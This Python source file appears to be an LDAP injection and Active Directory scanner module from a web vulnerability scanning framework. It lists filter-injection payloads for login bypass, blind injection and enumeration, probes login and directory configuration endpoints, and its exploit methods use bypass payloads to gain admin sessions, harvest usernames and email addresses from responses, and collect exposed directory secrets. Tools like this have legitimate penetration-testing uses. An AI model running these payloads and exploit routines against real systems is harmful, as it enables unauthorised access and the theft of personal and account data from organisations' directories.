import re
from urllib.parse import urljoin, urlparse
from modules.base import BaseModule
from core.utils import extract_params, random_string


class LdapModule(BaseModule):
    name = "ldap"
    description = "LDAP Injection & Active Directory Scanner"
    exploitable = True
    
    auth_payloads = [
        ("*", "wildcard"),
        ("*)(uid=*))(|(uid=*", "filter injection"),
        ("admin)(&)", "filter bypass"),
        ("*)(objectClass=*", "object enumeration"),
        ("*)(&(objectClass=user)", "user enumeration"),
        ("admin)(|(password=*)", "password bypass"),
        ("x])))%00", "null byte"),
        ("*))%00", "null termination"),
        (")(cn=*)(|(cn=*", "cn injection"),
        ("admin)(!(&(1=0", "boolean injection"),
        ("*)(uid=*))(|(uid=*", "auth bypass"),
        ("*))(|(objectclass=*", "class enum"),
        ("admin)(userPassword=*", "password extraction"),
        ("*)(mail=*@*", "email enumeration"),
        ("admin)(&(objectClass=user)(objectClass=person))", "compound filter"),
    ]
    
    blind_payloads = [
        ("admin*", True),
        ("admi*", True),
        ("adm*", True),
        ("*dmin", True),
        ("a])))%00", False),
        ("*)(INVALID", False),
    ]
    
    ad_attributes = [
        "sAMAccountName", "userPrincipalName", "distinguishedName",
        "memberOf", "primaryGroupID", "objectSid", "objectGUID",
        "whenCreated", "whenChanged", "lastLogon", "lastLogonTimestamp",
        "pwdLastSet", "accountExpires", "userAccountControl",
        "mail", "telephoneNumber", "department", "title", "manager",
        "homeDirectory", "scriptPath", "profilePath",
    ]
    
    common_usernames = [
        "admin", "administrator", "root", "user", "test", "guest",
        "operator", "manager", "support", "helpdesk", "service",
        "backup", "ftp", "www", "web", "mail", "postmaster",
    ]
    
    async def scan(self, target):
        self.findings = []
        
        await self._detect_ldap_endpoints(target)
        await self._test_login_injection(target)
        await self._test_search_injection(target)
        await self._test_blind_injection(target)
        await self._enumerate_users(target)
        await self._check_ad_exposure(target)
        
        return self.findings
    
    async def _detect_ldap_endpoints(self, target):
        base = self.get_base(target)
        
        ldap_paths = [
            "/login", "/signin", "/auth", "/authenticate",
            "/ldap", "/ldap/login", "/ldap/auth",
            "/adfs", "/adfs/ls", "/adfs/oauth2",
            "/api/auth", "/api/login", "/api/ldap",
            "/sso", "/sso/login", "/saml", "/saml/login",
            "/directory", "/directory/search",
            "/search/users", "/api/users/search",
            "/admin/login", "/admin/auth",
        ]
        
        for path in ldap_paths:
            url = urljoin(base, path)
            resp = await self.http.get(url)
            
            if resp.get("status") in [200, 302, 401]:
                text = resp.get("text", "").lower()
                headers = resp.get("headers", {})
                
                ldap_indicators = [
                    "ldap", "active directory", "domain", "distinguished name",
                    "sAMAccountName", "userPrincipalName", "objectClass",
                    "cn=", "dc=", "ou=", "uid=", "dn=",
                ]
                
                for indicator in ldap_indicators:
                    if indicator.lower() in text:
                        self.add_finding(
                            "INFO",
                            f"LDAP/AD endpoint detected",
                            url=url,
                            evidence=f"Indicator: {indicator}"
                        )
                        break
    
    async def _test_login_injection(self, target):
        base = self.get_base(target)
        
        login_endpoints = [
            "/login", "/signin", "/auth", "/api/login", "/api/auth",
            "/ldap/login", "/admin/login", "/user/login",
        ]
        
        for endpoint in login_endpoints:
            url = urljoin(base, endpoint)
            
            baseline_resp = await self.http.post(url, data={
                "username": "invaliduser123",
                "password": "invalidpass123"
            })
            
            if not baseline_resp.get("status"):
                continue
            
            baseline_len = len(baseline_resp.get("text", ""))
            baseline_status = baseline_resp.get("status")
            
            for payload, payload_type in self.auth_payloads:
                resp = await self.http.post(url, data={
                    "username": payload,
                    "password": "anything"
                })
                
                if not resp.get("status"):
                    continue
                
                resp_len = len(resp.get("text", ""))
                resp_status = resp.get("status")
                text = resp.get("text", "").lower()
                
                if resp_status in [200, 302] and baseline_status in [401, 403]:
                    self.add_finding(
                        "CRITICAL",
                        f"LDAP Authentication Bypass",
                        url=url,
                        parameter="username",
                        evidence=f"Payload: {payload} ({payload_type})"
                    )
                    self.record_success(payload, url)
                    return
                
                if abs(resp_len - baseline_len) > 500:
                    ldap_errors = [
                        "ldap", "invalid filter", "bad search filter",
                        "protocol error", "operations error", "invalid dn",
                        "invalid attribute", "no such object", "constraint violation",
                    ]
                    
                    for error in ldap_errors:
                        if error in text:
                            self.add_finding(
                                "HIGH",
                                f"LDAP Injection (Error-based)",
                                url=url,
                                parameter="username",
                                evidence=f"Payload: {payload}, Error: {error}"
                            )
                            self.record_success(payload, url)
                            return
                
                resp2 = await self.http.post(url, data={
                    "username": "admin",
                    "password": payload
                })
                
                if resp2.get("status") in [200, 302] and baseline_status in [401, 403]:
                    self.add_finding(
                        "CRITICAL",
                        f"LDAP Password Bypass",
                        url=url,
                        parameter="password",
                        evidence=f"Payload: {payload} ({payload_type})"
                    )
                    self.record_success(payload, url)
                    return
    
    async def _test_search_injection(self, target):
        params = extract_params(target)
        
        search_params = ["q", "query", "search", "user", "username", "name", 
                        "filter", "uid", "cn", "dn", "mail", "email"]
        
        test_params = [p for p in params if p.lower() in search_params] or search_params[:3]
        
        for param in test_params:
            for payload, payload_type in self.auth_payloads:
                resp = await self.test_param(target, param, payload)
                
                if not resp.get("status"):
                    continue
                
                text = resp.get("text", "").lower()
                
                success_indicators = [
                    "cn=", "dn=", "uid=", "ou=", "dc=",
                    "objectclass", "samaccountname", "userprincipalname",
                    "distinguishedname", "memberof",
                ]
                
                for indicator in success_indicators:
                    if indicator in text:
                        self.add_finding(
                            "CRITICAL",
                            f"LDAP Search Injection",
                            url=target,
                            parameter=param,
                            evidence=f"Payload: {payload}, AD data exposed"
                        )
                        self.record_success(payload, target)
                        return
                
                error_indicators = [
                    "invalid filter", "bad filter", "filter error",
                    "ldap error", "search error", "invalid syntax",
                ]
                
                for error in error_indicators:
                    if error in text:
                        self.add_finding(
                            "HIGH",
                            f"LDAP Injection Detected",
                            url=target,
                            parameter=param,
                            evidence=f"Payload: {payload}, Error: {error}"
                        )
                        self.record_success(payload, target)
                        return
    
    async def _test_blind_injection(self, target):
        params = extract_params(target)
        if not params:
            return
        
        param = params[0]
        
        responses = {}
        for payload, expected_valid in self.blind_payloads:
            resp = await self.test_param(target, param, payload)
            if resp.get("status"):
                responses[payload] = {
                    "len": len(resp.get("text", "")),
                    "status": resp.get("status"),
                    "expected": expected_valid
                }
        
        if len(responses) < 4:
            return
        
        valid_lens = [r["len"] for p, r in responses.items() if r["expected"]]
        invalid_lens = [r["len"] for p, r in responses.items() if not r["expected"]]
        
        if valid_lens and invalid_lens:
            avg_valid = sum(valid_lens) / len(valid_lens)
            avg_invalid = sum(invalid_lens) / len(invalid_lens)
            
            if abs(avg_valid - avg_invalid) > 100:
                self.add_finding(
                    "HIGH",
                    "Blind LDAP Injection Detected",
                    url=target,
                    parameter=param,
                    evidence=f"Response length differs: valid={avg_valid:.0f}, invalid={avg_invalid:.0f}"
                )
    
    async def _enumerate_users(self, target):
        base = self.get_base(target)
        
        enum_endpoints = [
            "/api/users", "/api/user", "/api/users/search",
            "/users", "/user/check", "/user/exists",
            "/auth/check", "/login/check", "/api/check-user",
        ]
        
        for endpoint in enum_endpoints:
            url = urljoin(base, endpoint)
            
            valid_user = None
            responses = {}
            
            for username in self.common_usernames[:5]:
                resp = await self.http.get(f"{url}?username={username}")
                if not resp.get("status"):
                    resp = await self.http.post(url, data={"username": username})
                
                if resp.get("status"):
                    responses[username] = {
                        "len": len(resp.get("text", "")),
                        "status": resp.get("status"),
                        "text": resp.get("text", "")[:200]
                    }
            
            fake_user = f"nonexistent_{random_string(8)}"
            fake_resp = await self.http.get(f"{url}?username={fake_user}")
            if not fake_resp.get("status"):
                fake_resp = await self.http.post(url, data={"username": fake_user})
            
            if fake_resp.get("status"):
                fake_data = {
                    "len": len(fake_resp.get("text", "")),
                    "status": fake_resp.get("status")
                }
                
                for username, data in responses.items():
                    if abs(data["len"] - fake_data["len"]) > 50 or data["status"] != fake_data["status"]:
                        self.add_finding(
                            "MEDIUM",
                            "User Enumeration via LDAP",
                            url=url,
                            evidence=f"User '{username}' exists (different response)"
                        )
                        return
    
    async def _check_ad_exposure(self, target):
        base = self.get_base(target)
        
        ad_paths = [
            "/api/ldap/config", "/ldap/config", "/ad/config",
            "/api/directory", "/directory/config",
            "/.well-known/webfinger", "/autodiscover/autodiscover.xml",
            "/api/users?$expand=all", "/api/groups",
            "/odata/users", "/odata/groups",
            "/_api/web/currentuser", "/_api/web/siteusers",
        ]
        
        for path in ad_paths:
            url = urljoin(base, path)
            resp = await self.http.get(url)
            
            if resp.get("status") == 200:
                text = resp.get("text", "")
                
                for attr in self.ad_attributes:
                    if attr.lower() in text.lower():
                        self.add_finding(
                            "HIGH",
                            "Active Directory Data Exposure",
                            url=url,
                            evidence=f"AD attribute exposed: {attr}"
                        )
                        
                        secrets = self.extract_secrets(text)
                        if secrets:
                            self.add_exploit_data("ad_secrets", secrets)
                        
                        return
    
    async def exploit(self, target, finding):
        if "Authentication Bypass" in finding.get("description", ""):
            return await self._exploit_auth_bypass(target, finding)
        elif "Search Injection" in finding.get("description", ""):
            return await self._exploit_search(target, finding)
        return None
    
    async def _exploit_auth_bypass(self, target, finding):
        url = finding.get("url", target)
        
        admin_payloads = [
            {"username": "*)(uid=admin)(|(uid=*", "password": "x"},
            {"username": "admin)(&)", "password": "x"},
            {"username": "*)(objectClass=user", "password": "x"},
        ]
        
        for creds in admin_payloads:
            resp = await self.http.post(url, data=creds, allow_redirects=True)
            
            if resp.get("status") == 200:
                text = resp.get("text", "").lower()
                
                admin_indicators = ["admin", "dashboard", "panel", "welcome", "logout"]
                
                for indicator in admin_indicators:
                    if indicator in text:
                        self.add_exploit_data("auth_bypass", {
                            "url": url,
                            "payload": creds,
                            "access": "admin"
                        })
                        return {"success": True, "access": "admin", "url": url}
        
        return None
    
    async def _exploit_search(self, target, finding):
        param = finding.get("parameter", "q")
        
        enum_payloads = [
            "*)(objectClass=user",
            "*)(objectClass=person",
            "*)(objectClass=group",
            "*)(mail=*@*",
        ]
        
        users = []
        
        for payload in enum_payloads:
            resp = await self.test_param(target, param, payload)
            
            if resp.get("status") == 200:
                text = resp.get("text", "")
                
                user_patterns = [
                    r'cn=([^,\s]+)',
                    r'uid=([^,\s]+)',
                    r'sAMAccountName["\s:=]+([^",\s]+)',
                    r'mail["\s:=]+([^",\s@]+@[^",\s]+)',
                ]
                
                for pattern in user_patterns:
                    matches = re.findall(pattern, text, re.IGNORECASE)
                    users.extend(matches)
        
        if users:
            unique_users = list(set(users))[:50]
            self.add_exploit_data("enumerated_users", unique_users)
            return {"success": True, "users": unique_users}
        
        return None
